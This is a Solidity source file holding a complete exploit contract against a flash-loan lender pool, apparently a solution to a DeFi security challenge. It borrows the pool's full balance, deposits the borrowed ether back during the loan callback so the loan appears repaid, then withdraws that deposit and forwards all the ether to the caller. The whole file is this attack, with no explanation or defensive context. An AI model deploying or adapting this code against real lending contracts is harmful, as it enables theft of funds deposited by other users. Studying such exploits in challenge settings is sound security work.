pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ILender {
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}

contract SideEntraceLenderExploit is IFlashLoanEtherReceiver {
    using Address for address payable;

    function execute() external payable override {
        ILender(msg.sender).deposit{value: msg.value}();
    }
    
    function exploit(address _target) external {
        ILender lender = ILender(_target);
        lender.flashLoan(_target.balance);
        lender.withdraw();
        msg.sender.sendValue(address(this).balance);
    }

    fallback() external payable { }
}